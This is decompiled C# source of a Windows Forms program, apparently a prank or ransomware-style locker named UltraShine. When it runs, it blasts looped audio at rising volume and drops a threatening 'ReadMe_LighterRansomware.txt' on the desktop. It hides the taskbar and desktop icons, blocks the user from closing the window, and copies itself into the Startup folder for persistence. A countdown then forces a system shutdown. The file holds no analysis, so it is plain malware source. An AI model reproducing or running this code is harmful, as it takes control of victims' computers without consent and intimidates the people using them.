using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using UltraShine.My;
using UltraShine.My.Resources;

namespace UltraShine
{
	// Token: 0x0200000B RID: 11
	[DesignerGenerated]
	public partial class Form1 : Form
	{
		// Token: 0x0600001F RID: 31 RVA: 0x00002538 File Offset: 0x00000738
		public Form1()
		{
			base.Load += this.Form1_Load;
			base.LostFocus += this.Form1_LostFocus;
			base.FormClosing += this.Form1_FormClosing;
			this.InitializeComponent();
		}

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x06000020 RID: 32 RVA: 0x00002587 File Offset: 0x00000787
		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = base.CreateParams;
				createParams.ClassStyle |= 512;
				return createParams;
			}
		}

		// Token: 0x06000021 RID: 33
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

		// Token: 0x06000022 RID: 34
		[DllImport("User32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern void SetWindowPos(int hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, int wFlags);

		// Token: 0x06000023 RID: 35 RVA: 0x000025A4 File Offset: 0x000007A4
		public void TaskBarVisible(bool Visible)
		{
			string text = "Shell_TrayWnd";
			string text2 = "";
			int num = Form1.FindWindow(ref text, ref text2);
			if (Visible)
			{
				Form1.SetWindowPos(num, 0, 0, 0, 0, 0, 64);
				return;
			}
			Form1.SetWindowPos(num, 0, 0, 0, 0, 0, 128);
		}

		// Token: 0x06000024 RID: 36
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern void keybd_event(byte bVk, byte bScan, long dwFlags, long dwExtraInfo);

		// Token: 0x06000025 RID: 37
		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SystemParametersInfoA", ExactSpelling = true, SetLastError = true)]
		private static extern int SystemParametersInfo(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

		// Token: 0x06000026 RID: 38
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetAsyncKeyState(int vkey);

		// Token: 0x06000027 RID: 39
		[DllImport("user32.dll", SetLastError = true)]
		private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x06000028 RID: 40 RVA: 0x000025E8 File Offset: 0x000007E8
		private void Form1_Load(object sender, EventArgs e)
		{
			MyProject.Computer.Audio.Play(Resources.dox, AudioPlayMode.BackgroundLoop);
			try
			{
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
				Form1.SendMessage(base.Handle, 793U, base.Handle, (IntPtr)11468800L);
			}
			catch (Exception ex)
			{
			}
			try
			{
				string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "ReadMe_LighterRansomware.txt");
				string text2 = "If you are reading this, you have unblocked or cheated your way out. Remember, WE KNOW WHAT YOU DID....";
				File.WriteAllText(text, text2);
			}
			catch (Exception ex2)
			{
			}
			try
			{
				Screen screen = Screen.AllScreens[1];
				MyProject.Forms.Form2.StartPosition = FormStartPosition.Manual;
				MyProject.Forms.Form2.Location = screen.Bounds.Location + (Size)new Point(100, 100);
				MyProject.Forms.Form2.Show();
				this.Timer2.Start();
			}
			catch (Exception ex3)
			{
			}
			this.TaskBarVisible(false);
			MyProject.Forms.Form3.Show();
			MyProject.Forms.Form4.Show();
			Desktop.DesktopIconsHide();
			try
			{
				File.Copy(Application.ExecutablePath, "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Generic.exe");
			}
			catch (Exception ex4)
			{
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00002A00 File Offset: 0x00000C00
		private void Form1_LostFocus(object sender, EventArgs e)
		{
			base.Focus();
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00002A09 File Offset: 0x00000C09
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (e.CloseReason == CloseReason.UserClosing)
			{
				e.Cancel = true;
			}
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00002A1B File Offset: 0x00000C1B
		private void Timer1_Tick(object sender, EventArgs e)
		{
			base.BringToFront();
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00002A24 File Offset: 0x00000C24
		private void Timer2_Tick(object sender, EventArgs e)
		{
			this.Label13.Text = Conversions.ToString(Conversions.ToDouble(this.Label13.Text) - 1.0);
			if (Conversions.ToDouble(this.Label13.Text) == 10.0)
			{
				this.Label13.ForeColor = Color.Red;
			}
			if (Conversions.ToDouble(this.Label13.Text) == 0.0)
			{
				this.Label13.ForeColor = Color.White;
				this.Label10.Text = Conversions.ToString(Conversions.ToDouble(this.Label10.Text) - 1.0);
				this.Label13.Text = Conversions.ToString(59);
			}
			if (Conversions.ToDouble(this.Label10.Text) == 10.0)
			{
				this.Label10.ForeColor = Color.Red;
			}
			if (Conversions.ToDouble(this.Label10.Text) == 0.0)
			{
				this.Label10.ForeColor = Color.White;
				this.Label8.Text = Conversions.ToString(Conversions.ToDouble(this.Label8.Text) - 1.0);
				this.Label10.Text = Conversions.ToString(59);
			}
			if (Conversions.ToDouble(this.Label8.Text) == 10.0)
			{
				this.Label8.ForeColor = Color.Red;
			}
			if (Conversions.ToDouble(this.Label8.Text) == 0.0)
			{
				this.Label13.ForeColor = Color.White;
				Interaction.Shell("shutdown -s -t 3", AppWinStyle.MinimizedFocus, false, -1);
			}
		}

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x0600002F RID: 47 RVA: 0x000032C9 File Offset: 0x000014C9
		// (set) Token: 0x06000030 RID: 48 RVA: 0x000032D4 File Offset: 0x000014D4
		internal virtual Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
				Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x06000031 RID: 49 RVA: 0x00003317 File Offset: 0x00001517
		// (set) Token: 0x06000032 RID: 50 RVA: 0x0000331F File Offset: 0x0000151F
		internal virtual PictureBox PictureBox1
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x06000033 RID: 51 RVA: 0x00003328 File Offset: 0x00001528
		// (set) Token: 0x06000034 RID: 52 RVA: 0x00003330 File Offset: 0x00001530
		internal virtual Timer Timer2
		{
			[CompilerGenerated]
			get
			{
				return this._Timer2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
				Timer timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this._Timer2 = value;
				timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x06000035 RID: 53 RVA: 0x00003373 File Offset: 0x00001573
		// (set) Token: 0x06000036 RID: 54 RVA: 0x0000337B File Offset: 0x0000157B
		internal virtual Label Label8
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x06000037 RID: 55 RVA: 0x00003384 File Offset: 0x00001584
		// (set) Token: 0x06000038 RID: 56 RVA: 0x0000338C File Offset: 0x0000158C
		internal virtual Label Label10
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x06000039 RID: 57 RVA: 0x00003395 File Offset: 0x00001595
		// (set) Token: 0x0600003A RID: 58 RVA: 0x0000339D File Offset: 0x0000159D
		internal virtual Label Label11
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x0600003B RID: 59 RVA: 0x000033A6 File Offset: 0x000015A6
		// (set) Token: 0x0600003C RID: 60 RVA: 0x000033AE File Offset: 0x000015AE
		internal virtual Label Label13
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x0600003D RID: 61 RVA: 0x000033B7 File Offset: 0x000015B7
		// (set) Token: 0x0600003E RID: 62 RVA: 0x000033BF File Offset: 0x000015BF
		internal virtual Label Label12
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x0600003F RID: 63 RVA: 0x000033C8 File Offset: 0x000015C8
		// (set) Token: 0x06000040 RID: 64 RVA: 0x000033D0 File Offset: 0x000015D0
		internal virtual GroupBox GroupBox1
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x0400000D RID: 13
		public const int VK_LWIN = 91;

		// Token: 0x0400000E RID: 14
		public const int KEYEVENTF_KEYUP = 2;

		// Token: 0x0400000F RID: 15
		private int i;

		// Token: 0x04000010 RID: 16
		private int i2;

		// Token: 0x04000011 RID: 17
		private int i3;

		// Token: 0x04000012 RID: 18
		private int i4;

		// Token: 0x04000013 RID: 19
		private int i5;

		// Token: 0x04000014 RID: 20
		private new string Location;

		// Token: 0x04000015 RID: 21
		private const int SETDESKWALLPAPER = 20;

		// Token: 0x04000016 RID: 22
		private const int UPDATEINIFILE = 1;

		// Token: 0x04000017 RID: 23
		private RichTextBox erhaltenerText;

		// Token: 0x04000018 RID: 24
		private string path1;

		// Token: 0x04000019 RID: 25
		private string path2;

		// Token: 0x0400001A RID: 26
		private object userDir;

		// Token: 0x0400001B RID: 27
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400001C RID: 28
		private const uint WM_APPCOMMAND = 793U;

		// Token: 0x0400001D RID: 29
		private const uint APPCOMMAND_VOLUME_UP = 10U;

		// Token: 0x0400001E RID: 30
		private const uint APPCOMMAND_VOLUME_DOWN = 9U;

		// Token: 0x0400001F RID: 31
		private const uint APPCOMMAND_VOLUME_MUTE = 8U;

		// Token: 0x04000020 RID: 32
		private const uint APPCOMMAND_MICROPHONE_VOLUME_UP = 7U;

		// Token: 0x04000021 RID: 33
		private const uint APPCOMMAND_MICROPHONE_VOLUME_DOWN = 6U;

		// Token: 0x04000022 RID: 34
		private const uint APPCOMMAND_MICROPHONE_VOLUME_MUTE = 5U;

		// Token: 0x04000023 RID: 35
		private const uint APPCOMMAND_SPEAKER_VOLUME_UP = 175U;

		// Token: 0x04000024 RID: 36
		private const uint APPCOMMAND_SPEAKER_VOLUME_DOWN = 176U;

		// Token: 0x04000025 RID: 37
		private const uint APPCOMMAND_SPEAKER_VOLUME_MUTE = 178U;
	}
}
